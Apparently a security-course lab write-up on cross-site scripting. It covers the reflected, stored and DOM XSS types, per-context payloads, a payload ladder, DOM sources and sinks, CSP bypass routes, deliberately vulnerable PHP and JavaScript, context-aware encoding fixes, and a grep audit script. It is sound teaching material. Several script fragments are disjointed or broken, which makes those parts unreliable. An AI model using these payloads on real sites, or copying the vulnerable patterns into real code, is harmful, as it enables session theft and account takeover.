Cross-Site Scripting and DOM XSS

Summary

XSS is ps-01's model with the roles reversed: the server produces a string containing your
data, and the browser's parser treats it as markup. The bug is a disagreement between what
the server meant and what the browser did.

The critical insight from PortSwigger's framing is that the output context determines the
defence. <script> is the vulnerability everyone looks for; it is one of at least eight.

The three types

  REFLECTED   your input comes back in the response to your own request
              -> needs a victim to click a crafted link
              -> phishing-grade, easy to spot, usually patched first

  STORED      your input is saved and served to OTHER users
              -> no victim interaction needed beyond visiting the page
              -> session theft at scale, worms (Samy), defacement
              -> the highest severity of the three

  DOM         the payload never reaches the server; it executes in JS
              -> source and sink are both in the page
              -> invisible to server-side WAFs and to server logs
              -> needs `document.write`/innerHTML/`eval`/location

Output context is the whole game

<!-- 1. HTML BODY -->
<p>search for: $q</p>
   payload: <script>alert(1)</script>

<!-- 2. HTML ATTRIBUTE -->
<a href="/x?q=$q">click</a>
   payload: " onmouseover="alert(1)      -> escapes the attribute, adds a handler
   payload: "><script>alert(1)</script>  -> closes the tag entirely

<!-- 3. UNQUOTED ATTRIBUTE -->
<div class=$q>
   payload: x onmouseover=alert(1)       -> a space is all you need

<!-- 4. JAVASCRIPT STRING -->
<script>var q = "$q";</script>
   payload: ";alert(1);//               -> escapes the string literal

<!-- 5. JAVASCRIPT BLOCK -->
<script>var n = $q;</script>            -> no quotes at all
   payload: 1;alert(1)

<!-- 6. URL PARAMETER -->
<a href="/redirect?next=$q">go</a>
   payload: javascript:alert(1)
   -> ONLY fires if the user clicks. Not "XSS" in most definitions.

<!-- 7. CSS -->
<style> .x { background: url($q); } </style>
   payload: ); }          -> breaks out; or a javascript: URL in some engines

<!-- 8. HTTP HEADER / PDF / anything reflected**
   Location: $q            -> CRLF injection, open redirect, not script

If your payload "does not work", you are almost certainly in the wrong
context. Changing <script> to "><img src=x onerror=alert(1)> moves
you from context 1 to context 2.

The payload ladder

  1. <script>alert(1)</script>          does a <script> tag run here?
  2. <img src=x onerror=alert(1)>        any tag? any event handler?
  3. <svg onload=alert(1)>               different parser, different result
  4. "><img src=x onerror=alert(1)>     in an attribute?
  5. javascript:alert(1)                in an href/src?
  6. <body onload=alert(1)>             no allowed tags, but onload?
  7. */</script><script>alert(1)</script>  escaping a JS string comment
  8. {{constructor.constructor('alert(1)')()}}   template/DOM prototype

Try them in order. Each one is a different assumption about what the
parser permits.

DOM XSS: source and sink

  SOURCE (where attacker data enters JS)
    location.hash / location.search / location.href / document.referrer
    document.URL / document.documentURI / document.baseURI
    document.cookie / localStorage / sessionStorage / IndexedDB
    postMessage events
    fetch/XHR response data
    form input values

  SINK (where it becomes code)
    eval() / new Function() / setTimeout(string) / setInterval(string)
    innerHTML / outerHTML / insertAdjacentHTML / document.write
    jQuery .html() .append() .prepend() .after() .before()
    React dangerouslySetInnerHTML
    element.setAttribute('href'|'src'|'on*', value)   -> javascript: URL
    location = value / location.assign(value) / location.replace(value)

  THE RULE: NEVER pass attacker-influenceable data to a sink. Not
  escaped, not filtered, not "it's fine because it's same-origin".
  innerHTML does not execute <script>, but it DOES execute
  <img onerror=...>, which is exactly as good for you.

<!-- the canonical DOM XSS, on purpose -->
<button onclick="location = getParameter('next')">go</button>
<script>
  function getParameter(name) {
    return decodeURIComponent(
      new RegExp('[?&]' + name + '=([^&]*)').exec(location.search)[1]);
  }
</script>

?next=javascript:alert(1) then clicking "go" executes. No server
involvement, no server log, no server-side filter sees it.

What actually stops it

  PRIMARY: encode on output, per context. The server must know the context
           and encode for it. context-aware output encoding is the fix.

  SECONDARY, and necessary anyway:
    - CSP, to reduce the impact of anything that slips through
    - HttpOnly cookies, so a stolen XSS cannot read the session
    - SameSite, so it cannot be used cross-site
    - a response header, so it cannot be used cross-origin

  WHAT DOES NOT WORK:
    - input validation / filtering (blacklists are bypassed forever)
    - <script>alert</script>            (contexts 2-7 still work)
    - strip < and > only                (attribute and JS contexts survive)
    - HTML entities once, at input time (wrong layer, wrong contexts)
    - regex /<.*>/                     (attribute contexts, case, spacing)

Encoding at input time is a classic mistake. By the time the value
reaches output it may be in a different context. Encode at output, in the
context, and know which context that is.

CSP, honestly

  Content-Security-Policy: default-src 'self'

  WHAT IT ACTUALLY DOES: it restricts where resources may come from and
  whether inline script may run. With 'unsafe-inline' absent, an injected
  <script> does not execute.

  WHAT IT DOES NOT DO:
    - it does not stop the injection
    - it does not stop exfiltration via allowed destinations
    - it is bypassable in real deployments via
        * a nonce or hash that is predictable/leaked
        * JSONP endpoints on the same origin
        * open redirect to an allowed origin
        * 'strict-dynamic' combined with a reachable trusted script
        * base-uri / form-action being unrestricted

  USE IT, but as defence in depth behind output encoding, not instead of it.

Terminology

Term Meaning
XSS Script executing in a trusted origin
Reflected XSS Comes back in your own response
Stored XSS Saved and served to others; highest severity
DOM XSS Source and sink both client-side; invisible to the server
Source Where attacker data enters JS
Sink Where it becomes code
Output context HTML body, attribute, JS, URL, CSS — determines the payload
Context-aware encoding Encode for the specific context
HTML entity encoding & < > " ' → entities; for HTML contexts
JS escaping Backslash/unicode escapes; for JS string contexts
URL encoding Percent-encoding; for URL contexts
CSP Content-Security-Policy header
dangerouslySetInnerHTML React's deliberate XSS hole
Sanitizer A library that removes rather than encodes
HttpOnly Cookie flag; JS cannot read the session

<?php

$q = $_GET['q'] ?? '';
$attr = $_GET['a'] ?? '';

echo "<div class=" . $attr . ">unquoted</div>";                  // 3 unquoted attribute
echo "<script>var j = \"$js\";</script>";                       // 4 JS string
echo "<script>var n = $q;</script>";                            // 5 JS block

<?php
// STORED xss: one person's input is served to everyone else.
session_start();
$db = new PDO('sqlite:' . __DIR__ . '/x.db');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

  echo "=== CONTEXT 3: unquoted attribute ==="

  done

  done

  echo "=== THE LADDER, in order ==="
  echo "  1 <script>alert(1)</script>      works in context 1 only"
  echo "  2 <img src=x onerror=alert(1)>    works in 1, 2, 3"
  echo "  3 <svg onload=alert(1)>          works in 1"
  echo "  4 \"><img src=x onerror=alert(1)> works in 2"

{

  echo
  echo "  THE POINT: stored XSS needs no victim interaction. Visiting a page"
  echo "  is enough. If that page sets a session cookie without HttpOnly,"
  echo "  the payload steals it and the attacker replays it."

  echo "  (In the real world this is how account takeover happens on sites"
  echo "   with a comments field, a profile bio, or a filename.)"

# --- 4. the fix, per context ---
cat > 03-fix.php <<'PHP'
<?php
// The same eight contexts, correctly encoded. Compare line by line.
function e_html($s)  { return htmlspecialchars($s, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'); }
function e_attr($s)  { return e_html($s); }
function e_js($s)    { return json_encode($s, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT); }
function e_url($s)   { return rawurlencode($s); }

$q    = $_GET['q'] ?? '';
$attr = $_GET['a'] ?? '';
$js   = $_GET['j'] ?? '';
header('Content-Type: text/html; charset=utf-8');
echo "<p>q = "     . e_html($q)  . "</p>";                          // 1
echo "<a href='/x?q=" . e_attr($q) . "'>link</a>";                 // 2
echo "<div class=\"" . e_attr($attr) . "\">quoted</div>";          // 3
echo "<script>var j = " . e_js($js) . ";</script>";                // 4
echo "<a href=\"/go?to=" . e_url($q) . "\">url</a>";               // 6

// AND: a CSP that would have limited the damage anyway
header('Content-Security-Policy: default-src \'self\'; script-src \'self\'');
PHP
{
  echo "=== the fixed version's output for the same payloads ==="
  nohup php -S 127.0.0.1:8090 -t . > php2.log 2>&1 &
  sleep 1
  for p in '<script>alert(1)</script>' '"><img src=x onerror=alert(1)>'; do
    echo "  payload: $p"
    curl -s --get --data-urlencode "q=$p" http://127.0.0.1:8090/03-fix.php | grep -E "^<p|^<a" | head -2 | sed 's/^/    /'
  done
  echo
  echo "  Note e_js uses json_encode with HEX flags, not addslashes."
  echo "  addslashes is not JavaScript escaping - it produces invalid JS"
  echo "  for backslashes, quotes AND newlines, and gets it wrong."
  echo
  echo "  And note the CSP header on the fixed version. Encoding is the"
  echo "  fix; CSP is what limits the blast radius if something slips."
} 2>&1 | tee 04-fixed.txt

# --- 5. audit: find unencoded output without a source review ---
cat > 05-audit.sh <<'EOF'
#!/usr/bin/env bash
echo "=== 1. every output of user input ==="
grep -rnE 'echo|print|printf|innerHTML|document\.write|\.html\(|dangerouslySetInnerHTML' \
     --include="*.php" --include="*.js" . | grep -E '\$_(GET|POST|REQUEST|COOKIE)' | head -20

echo; echo "=== 2. outputs with NO encoding function in the line ==="
# This is the finding: an echo of user input that is not wrapped in an encoder
grep -rnE '(echo|print)\s+.*\$_' --include="*.php" . \
  | grep -vE 'htmlspecialchars|htmlentities|urlencode|intval|json_encode' | sed 's/^/  /'

echo; echo "=== 3. DOM sinks in JavaScript ==="
grep -rnE 'innerHTML|outerHTML|insertAdjacentHTML|document\.write|eval\(|new Function|setTimeout\(["'\'']' \
     --include="*.js" --include="*.html" . | sed 's/^/  /'

echo; echo "=== 4. DOM sources reaching a sink (the pairing that matters) ==="
grep -rnE 'location\.(search|hash|href)|document\.(URL|referrer|cookie)|URLSearchParams' \
     --include="*.js" --include="*.html" . | sed 's/^/  /'

echo; echo "=== 5. headers that should be present ==="
for h in content-security-policy x-content-type-options; do
  v=$(curl -sI --max-time 3 http://127.0.0.1:8080/contexts.php 2>/dev/null | grep -i "^$h" | head -1)
  printf "  %-26s %s\n" "$h" "${v:-ABSENT}"
done
c=$(curl -sI --max-time 3 http://127.0.0.1:8080/stored.php 2>/dev/null | grep -i set-cookie | head -1)
echo "  set-cookie on a session   ${c:-none}"
echo "  ^ no HttpOnly on that cookie means stored XSS steals the session."
EOF
chmod +x 05-audit.sh
./05-audit.sh 2>&1 | tee 06-audit.txt
rm -f cookies.txt

Step 2 is the deliverable: the same payload tried against eight contexts, with the result
recorded per context. <script>alert(1)</script> works in context 1 and nowhere else; the
quote-break works only in the attribute contexts. That table is why "my XSS payload doesn't
work" is nearly always a context problem, not a filter problem.

Step 4 shows json_encode with HEX flags for JS contexts rather than addslashes, which
is a genuinely common and genuinely wrong fix.
